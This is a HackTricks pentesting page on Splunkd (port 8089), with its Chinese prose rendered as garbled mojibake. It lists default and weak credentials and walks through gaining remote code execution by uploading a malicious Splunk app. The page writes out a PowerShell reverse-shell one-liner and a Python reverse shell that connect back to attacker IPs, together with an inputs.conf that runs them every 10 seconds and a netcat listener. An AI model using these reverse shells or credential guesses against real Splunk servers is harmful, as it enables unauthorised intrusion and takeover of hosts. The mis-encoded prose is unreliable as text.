# 8089 - Pentesting Splunkd

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **åŸºæœ¬ä¿¡æ¯**

Splunk æ˜¯ä¸€ä¸ª **æ—¥å¿—åˆ†æå·¥å…·**ï¼Œåœ¨ **æ”¶é›†ã€åˆ†æå’Œå¯è§†åŒ–æ•°æ®** ä¸­å‘æŒ¥ç€è‡³å…³é‡è¦çš„ä½œç”¨ã€‚è™½ç„¶å…¶æœ€åˆçš„ç›®çš„å¹¶ä¸æ˜¯ä½œä¸º **SIEMï¼ˆå®‰å…¨ä¿¡æ¯å’Œäº‹ä»¶ç®¡ç†ï¼‰** å·¥å…·ï¼Œä½†å®ƒåœ¨ **å®‰å…¨ç›‘æ§** å’Œ **ä¸šåŠ¡åˆ†æ** é¢†åŸŸè·å¾—äº†å¹¿æ³›çš„åº”ç”¨ã€‚

Splunk éƒ¨ç½²é€šå¸¸ç”¨äºå­˜å‚¨ **æ•æ„Ÿæ•°æ®**ï¼Œå¦‚æœæ”»å‡»è€…æˆåŠŸå…¥ä¾µç³»ç»Ÿï¼Œå®ƒå¯ä»¥æˆä¸º **æ½œåœ¨æ”»å‡»è€…çš„é‡è¦ä¿¡æ¯æ¥æº**ã€‚ **é»˜è®¤ç«¯å£ï¼š** 8089
```
PORT     STATE SERVICE VERSION
8089/tcp open  http    Splunkd httpd
```
{% hint style="info" %}
**Splunk web æœåŠ¡å™¨é»˜è®¤è¿è¡Œåœ¨ 8000 ç«¯å£**ã€‚
{% endhint %}

## æšä¸¾

### å…è´¹ç‰ˆ

Splunk Enterprise è¯•ç”¨ç‰ˆåœ¨ 60 å¤©åè½¬æ¢ä¸º **å…è´¹ç‰ˆ**ï¼Œè¯¥ç‰ˆæœ¬ **ä¸éœ€è¦èº«ä»½éªŒè¯**ã€‚ç³»ç»Ÿç®¡ç†å‘˜å®‰è£… Splunk çš„è¯•ç”¨ç‰ˆä»¥è¿›è¡Œæµ‹è¯•å¹¶ **éšåè¢«é—å¿˜** æ˜¯å¾ˆå¸¸è§çš„ã€‚è¿™å°†è‡ªåŠ¨è½¬æ¢ä¸ºæ²¡æœ‰ä»»ä½•å½¢å¼èº«ä»½éªŒè¯çš„å…è´¹ç‰ˆï¼Œä»è€Œåœ¨ç¯å¢ƒä¸­å¼•å…¥å®‰å…¨æ¼æ´ã€‚ä¸€äº›ç»„ç»‡å¯èƒ½ç”±äºé¢„ç®—é™åˆ¶é€‰æ‹©å…è´¹ç‰ˆï¼Œè€Œæ²¡æœ‰å®Œå…¨ç†è§£æ²¡æœ‰ç”¨æˆ·/è§’è‰²ç®¡ç†çš„å½±å“ã€‚

### é»˜è®¤å‡­æ®

åœ¨æ—§ç‰ˆæœ¬çš„ Splunk ä¸­ï¼Œé»˜è®¤å‡­æ®æ˜¯ **`admin:changeme`**ï¼Œè¿™äº›å‡­æ®åœ¨ç™»å½•é¡µé¢ä¸Šæ–¹ä¾¿åœ°æ˜¾ç¤ºã€‚\
ç„¶è€Œï¼Œ**æœ€æ–°ç‰ˆæœ¬çš„ Splunk** åœ¨ **å®‰è£…è¿‡ç¨‹ä¸­è®¾ç½®å‡­æ®**ã€‚å¦‚æœé»˜è®¤å‡­æ®æ— æ•ˆï¼Œå€¼å¾—æ£€æŸ¥å¸¸è§çš„å¼±å¯†ç ï¼Œå¦‚ `admin`ã€`Welcome`ã€`Welcome1`ã€`Password123` ç­‰ã€‚

### è·å–ä¿¡æ¯

ç™»å½• Splunk åï¼Œæˆ‘ä»¬å¯ä»¥ **æµè§ˆæ•°æ®**ã€è¿è¡Œ **æŠ¥å‘Š**ã€åˆ›å»º **ä»ªè¡¨æ¿**ã€ä» Splunkbase åº“ **å®‰è£…åº”ç”¨ç¨‹åº**ï¼Œå¹¶å®‰è£…è‡ªå®šä¹‰åº”ç”¨ç¨‹åºã€‚\
æ‚¨è¿˜å¯ä»¥è¿è¡Œä»£ç ï¼šSplunk æœ‰å¤šç§ **è¿è¡Œä»£ç ** çš„æ–¹å¼ï¼Œä¾‹å¦‚æœåŠ¡å™¨ç«¯ Django åº”ç”¨ç¨‹åºã€REST ç«¯ç‚¹ã€è„šæœ¬è¾“å…¥å’Œè­¦æŠ¥è„šæœ¬ã€‚åœ¨ Splunk æœåŠ¡å™¨ä¸Šè·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œçš„å¸¸è§æ–¹æ³•æ˜¯é€šè¿‡ä½¿ç”¨è„šæœ¬è¾“å…¥ã€‚

æ­¤å¤–ï¼Œç”±äº Splunk å¯ä»¥å®‰è£…åœ¨ Windows æˆ– Linux ä¸»æœºä¸Šï¼Œå¯ä»¥åˆ›å»ºè„šæœ¬è¾“å…¥æ¥è¿è¡Œ Bashã€PowerShell æˆ– Batch è„šæœ¬ã€‚

### Shodan

* `Splunk build`

## RCE

### åˆ›å»ºè‡ªå®šä¹‰åº”ç”¨ç¨‹åº

è‡ªå®šä¹‰åº”ç”¨ç¨‹åºå¯ä»¥è¿è¡Œ **Pythonã€Batchã€Bash æˆ– PowerShell è„šæœ¬**ã€‚\
è¯·æ³¨æ„ï¼Œ**Splunk è‡ªå¸¦ Python**ï¼Œå› æ­¤å³ä½¿åœ¨ **Windows** ç³»ç»Ÿä¸­ï¼Œæ‚¨ä¹Ÿèƒ½å¤Ÿè¿è¡Œ Python ä»£ç ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨ [**è¿™ä¸ª**](https://github.com/0xjpuff/reverse\_shell\_splunk) Splunk åŒ…æ¥å¸®åŠ©æˆ‘ä»¬ã€‚è¯¥ repo ä¸­çš„ **`bin`** ç›®å½•æœ‰ [Python](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/rev.py) å’Œ [PowerShell](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/run.ps1) çš„ç¤ºä¾‹ã€‚è®©æˆ‘ä»¬ä¸€æ­¥ä¸€æ­¥æ¥å®Œæˆè¿™ä¸ªè¿‡ç¨‹ã€‚

ä¸ºæ­¤ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦ä½¿ç”¨ä»¥ä¸‹ç›®å½•ç»“æ„åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰ Splunk åº”ç”¨ç¨‹åºï¼š
```shell-session
tree splunk_shell/

splunk_shell/
â”œâ”€â”€ bin
â””â”€â”€ default
```
**`bin`** ç›®å½•å°†åŒ…å«æˆ‘ä»¬æ‰“ç®—è¿è¡Œçš„ä»»ä½• **è„šæœ¬**ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ˜¯ä¸€ä¸ª **PowerShell** åå‘ shellï¼‰ï¼Œé»˜è®¤ç›®å½•å°†æœ‰æˆ‘ä»¬çš„ `inputs.conf` æ–‡ä»¶ã€‚æˆ‘ä»¬çš„åå‘ shell å°†æ˜¯ä¸€ä¸ª **PowerShell ä¸€è¡Œä»£ç ï¼š**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(
```
The [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) æ–‡ä»¶å‘Šè¯‰ Splunk **è¦è¿è¡Œå“ªä¸ªè„šæœ¬** ä»¥åŠå…¶ä»–æ¡ä»¶ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°†åº”ç”¨ç¨‹åºè®¾ç½®ä¸ºå¯ç”¨ï¼Œå¹¶å‘Šè¯‰ Splunk æ¯ 10 ç§’è¿è¡Œä¸€æ¬¡è„šæœ¬ã€‚é—´éš”å§‹ç»ˆä»¥ç§’ä¸ºå•ä½ï¼Œè¾“å…¥ï¼ˆè„šæœ¬ï¼‰ä»…åœ¨æ­¤è®¾ç½®å­˜åœ¨æ—¶æ‰ä¼šè¿è¡Œã€‚
```shell-session
cat inputs.conf

[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
æˆ‘ä»¬éœ€è¦ä¸€ä¸ª `.bat` æ–‡ä»¶ï¼Œå½“åº”ç”¨ç¨‹åºéƒ¨ç½²æ—¶è¿è¡Œå¹¶æ‰§è¡Œ PowerShell ä¸€è¡Œä»£ç ã€‚

ä¸‹ä¸€æ­¥æ˜¯é€‰æ‹© `Install app from file` å¹¶ä¸Šä¼ åº”ç”¨ç¨‹åºã€‚

<figure><img src="../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

åœ¨ä¸Šä¼ æ¶æ„è‡ªå®šä¹‰åº”ç”¨ç¨‹åºä¹‹å‰ï¼Œè®©æˆ‘ä»¬ä½¿ç”¨ Netcat æˆ– [socat](https://linux.die.net/man/1/socat) å¯åŠ¨ä¸€ä¸ªç›‘å¬å™¨ã€‚
```shell-session
sudo nc -lnvp 443

listening on [any] 443 ...
```
åœ¨ `Upload app` é¡µé¢ï¼Œç‚¹å‡»æµè§ˆï¼Œé€‰æ‹©æˆ‘ä»¬ä¹‹å‰åˆ›å»ºçš„ tarballï¼Œç„¶åç‚¹å‡» `Upload`ã€‚**ä¸€æ—¦æˆ‘ä»¬ä¸Šä¼ äº†åº”ç”¨ç¨‹åº**ï¼Œåº”ç”¨ç¨‹åºçš„çŠ¶æ€å°†è‡ªåŠ¨åˆ‡æ¢ä¸º `Enabled`ï¼Œè¿™æ—¶ä¼šæ”¶åˆ°ä¸€ä¸ª **åå‘ shell**ã€‚

#### Linux

å¦‚æœæˆ‘ä»¬å¤„ç†çš„æ˜¯ **Linux ä¸»æœº**ï¼Œæˆ‘ä»¬éœ€è¦åœ¨åˆ›å»º tarball å’Œä¸Šä¼ è‡ªå®šä¹‰æ¶æ„åº”ç”¨ç¨‹åºä¹‹å‰ **ç¼–è¾‘ `rev.py` Python è„šæœ¬**ã€‚å…¶ä½™çš„è¿‡ç¨‹å°†æ˜¯ç›¸åŒçš„ï¼Œæˆ‘ä»¬å°†åœ¨ Netcat ç›‘å¬å™¨ä¸Šè·å¾—åå‘ shell è¿æ¥ï¼Œç„¶åå¼€å§‹è¿›è¡Œã€‚
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
### RCE & Privilege Escalation

åœ¨ä»¥ä¸‹é¡µé¢ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°æœ‰å…³å¦‚ä½•æ»¥ç”¨æ­¤æœåŠ¡ä»¥æå‡æƒé™å¹¶è·å¾—æŒä¹…æ€§çš„è§£é‡Šï¼š

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## References

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
